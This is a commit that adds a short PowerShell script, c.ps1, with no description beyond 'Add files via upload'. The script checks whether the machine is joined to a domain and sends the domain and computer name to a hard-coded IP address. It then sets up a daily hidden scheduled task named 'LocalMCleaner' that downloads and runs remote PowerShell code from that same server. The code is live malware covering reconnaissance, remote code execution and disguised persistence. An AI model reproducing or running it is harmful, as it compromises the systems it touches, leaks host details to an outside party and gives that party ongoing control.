0c5ee5e4d3f003c5441e444695211d7cd26cbafa
joes233f <beej0e92@outlook.com>
2024-08-28 12:34:49 +0800

    Add files via upload

---
+++ c.ps1
@@ -0,0 +1,20 @@
+$computerInfo = Get-ComputerInfo  
+if ($computerInfo.CsPartOfDomain) 
+{ 
+    $domain = $computerInfo.Domain  
+    $computerName = $computerInfo.CsName  
+    $domain = $computerInfo.CsDomain
+    $fullString = $domain+"_"+$computerName 
+    $url = "http://64.182.116.12/images/?q="+$fullString  
+    try {  
+        $response = Invoke-WebRequest -Uri $url -Method Get -UseBasicParsing  
+    } catch { 
+    }  
+    $ccc = "powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://64.182.116.12/images/II11II11'))""
+    $str = "schtasks.exe /create /sc daily /tn LocalMCleaner /tr " + $ccc +" /st 11:30 /f"
+    iex  $str
+} 
+else
+{  
+    exit  
+}
